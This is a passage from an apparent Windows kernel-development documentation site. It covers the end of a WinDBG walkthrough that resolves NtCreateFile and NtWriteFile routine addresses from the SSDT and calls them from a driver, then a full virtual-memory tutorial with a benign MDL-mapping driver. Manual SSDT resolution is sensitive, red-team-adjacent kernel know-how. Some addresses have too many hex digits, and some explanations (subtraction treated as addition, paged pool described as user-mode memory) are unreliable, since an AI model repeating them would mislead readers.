value of eax is 0x55 (Dec: 85), after the operation the result is 0x154 (Dec: 340).\nIn the last part of this formula, the address of KiServiceTable is passed to rcx and the value of KiServiceTableAddress is subtracted from the rax register which stores the result 4 * SSN. Now I realize that you are confused here again.\nNotice that it subtracts the value rcx from rax, even though subtraction is typically done using sub. So in other words, this means subtracting KiServiceTableAddress from rax. So this will give the same result as KiServiceTableAddress + 4 * SSN. I realize that you are confused, but you can keep in mind that it will give the same result as the formula we want to do.\nTo see the address of the offset, mov qword ptr OffsetAddress (rsp+40h), add a bp at the address corresponding to rax and continue the program. Let‚Äôs take a look at the address we get:\nWe see that the address is fffffff8046a6c7e04. We already did an example with NtCreateFile above, so the addresses match.\nOur last section will be the formula part where we calculate the Routine address. After taking the offset of NtCreateFile from SSDT, we give the offset value to eax and then we see that it shifts 4 bit right. This is part of our formula.\nThen rcx is given the address of KiServiceTable and then we see that it subtracts rcx from rax (as I mentioned above, don‚Äôt get confused, think of it as addition). Thus, we have accessed the routine address of NtCreateFile. Let‚Äôs take a look at the resulting address:\nAs you can see, we successfully get the result fffffff8046ac2d240. Let‚Äôs add a bp where the routing address is called and see where it redirects the flow:\nTheen let‚Äôs see the result:\nFinally, let‚Äôs continue the driver and see if a .txt is actually created and data is written into it:\nThat‚Äôs all!\nConclusion In this documantetion, we analyzed SSDT in WinDBG and coded the findings. In the coding phase, we calculated the routine addresses of NtCreateFile and NtWriteFile with the formulas we learned. Using these addresses, we created a .txt file and wrote text in it. Finally, we analyzed the driver we coded in windbg.\nI hope this documentation was useful for you. SSDT may seem confusing at first glance, but I have tried to explain the details as much as possible so that it does not remain theoretical and can be better understood.\nReferences iRedTeam Notes - SSDT\nWikipedia - System Service Descriptor Table"},"title":"SSDT"},"/docs/winkernel-dev/wkd-virtual-memory/":{"data":{"":"","#":"In this documentation we will discuss Virtual Memory in Windows Kernel.\nWhat is Virtual Memory ‚ÄúWindows uses a virtual memory system that makes it appear as if each process has a large, dedicated address space. Virtual memory provides a more abstract view of memory, independent of the actual layout of physical memory. During execution, the memory manager ‚Äî with hardware support ‚Äî translates virtual addresses into the physical addresses where the data is actually stored. This allows the operating system to prevent any process from interfering with another process‚Äôs memory or overwriting the operating system‚Äôs critical data.‚Äù -Windows Internals Part 1 - Chapter 1, Page 39\nVirtual Memory is a memory management technique that provides an idealized abstraction of the data stored in physical memory addresses. This allows the operating system to prevent one process from interfering with another process‚Äôs memory or overwriting the operating system‚Äôs critical data.\nThis system uses a method to store data both in RAM and on the hard disk. The data is divided into small units called pages, each typically 4 KB in size.\nThese pages do not need to be stored contiguously in memory. In other words, an application‚Äôs data can be scattered in memory ‚Äî some parts may reside in RAM while others are stored on disk. This method optimizes memory usage without affecting application performance.\nAn advantage of this system is that applications do not need to be specially modified to benefit from paging. The memory management system performs these operations automatically. The diagram below illustrates this more clearly.\nThe size of the virtual address space varies depending on the hardware platform. For example, in Windows, the total virtual address space on 32-bit x86 systems is at most 4 GB. On this platform, by default, Windows allocates the lower half of this address space (addresses from 0x00000000 to 0x7FFFFFFF) for user-mode processes and the upper half (addresses from 0x80000000 to 0xFFFFFFFF) for the protected memory used by the operating system.\nIn 64-bit (x64) Windows systems, the virtual address space is much larger. Theoretically, a 64-bit addressing system provides up to 16 exabytes (2^64 bytes) of virtual address space. However, due to current hardware and operating system limitations, not all of this space is usable. In Windows x64 operating systems, the virtual address space is typically limited to 256 terabytes (2^48 bytes).\nCoding We will allocate a memory from the kernel space via the driver and then map it to the virtual address.\nYou can click here for the Github link.\n#pragma warning(disable: 4996) #include \u003cntddk.h\u003e NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unloaded\\n\"); return STATUS_SUCCESS; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); SIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Failed to Allocate Memory!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Allocated Memory at 0x%p\\n\", VirtualAddress); MDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"Failed to MDL Creation!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } MmBuildMdlForNonPagedPool(MDL); MappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Failed to Virtual Address Mapping!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Virtual Address mapping is successful! Address: 0x%p\\n\", MappedAddress); MmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } This is our code. Now let‚Äôs analyze this code:\nSIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; First, we start by defining the parameters in our driver. Their purposes are as follows:\nMemorySize: Specifies the size of the memory block to be allocated. In this example, I set it to 0x1000 (4 KB).\nVirtualAddress: Holds the address returned when the memory allocation is performed.\nMappedAddress: Holds the address to which the memory is mapped with a virtual address.\nMDL: Holds the MDL (Memory Descriptor List) structure used for mapping the memory to a virtual address.\nVirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Memory allocation failed\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Allocated Memory Address: 0x%p\\n\", VirtualAddress); In the first step, we allocate a 4 KB memory block from the Nonpaged Pool. If the allocation fails, we print an error message and exit. If it succeeds, we print the address of the allocated memory.\nIf you are unfamiliar with the Nonpaged Pool, here‚Äôs a short explanation:\nThe Nonpaged Pool is one of the memory pools used by the operating system. It refers to a memory area that is always accessible and cannot be paged out to disk (i.e., cannot undergo ‚Äúpaging‚Äù). Memory in the nonpaged pool is reserved for tasks of critical importance to the system. For example, hardware drivers or other kernel-mode components allocate from this pool because their memory access must always be fast and uninterrupted.\nAlongside this, there is also the Paged Pool, another memory pool used by the operating system. This pool refers to a memory area that can be paged out to disk. Memory in the paged pool is generally allocated for user-mode applications and services.\nMDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL allocation failed!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } Next, we create an MDL (Memory Descriptor List) structure to access the physical addresses of the memory block and map this block to a virtual address. The MDL stores the physical addresses and size of the memory, describing how the associated data is mapped from virtual to physical memory.\nMmBuildMdlForNonPagedPool(MDL); We then use this API to build the MDL structure. While building, this function fills in the physical memory addresses and size within the MDL.\nMappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Virtual address mapping failed!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Virtual address mapping successful! Address: 0x%p\\n\", MappedAddress); Finally, to map the memory to a virtual address, we use the MmMapLockedPagesSpecifyCache API. This function uses the MDL to map the specified memory block into virtual memory. If the operation fails, we print an error message and exit. If it succeeds, we print the mapped virtual address.\nMmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; At the end, when we are done, we free the memory. This is done by first calling MmUnmapLockedPages to unmap the virtual memory, then IoFreeMdl to free the MDL structure, and finally ExFreePool to release the allocated memory.\nRunning the Driver Well, let‚Äôs run our driver:\nConclusion In this documentation, we explored how Windows implements virtual memory in the kernel and how developers can work with it programmatically. We learned that virtual memory abstracts the physical memory layout, giving each process its own protected address space while enabling efficient memory utilization through paging.\nUnderstanding how virtual memory works at the kernel level ‚Äî and how to manage memory safely and efficiently ‚Äî is a critical skill for Windows kernel development. The techniques covered here form the basis for more advanced topics, such as direct hardware access, DMA operations, and custom memory management strategies in drivers.\nReferences Windows Internals Part 1 - Chapter 1, Virtual Memory (PAGE 39- 41) EN Wikipedia - Virtual Memory "},"title":"Virtual Memory"}}